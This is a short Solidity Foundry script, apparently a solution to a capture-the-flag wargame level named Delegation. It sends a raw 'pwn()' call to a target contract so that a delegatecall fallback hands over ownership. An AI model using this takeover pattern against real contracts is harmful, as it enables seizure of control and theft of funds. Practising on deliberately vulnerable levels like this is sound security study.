// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

contract DelegationScript is Script {
    function setUp() public {}

    function run() public {
        address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast();

        (bool success, ) = instanceAddress.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "call failed");

        vm.stopBroadcast();
    }
}
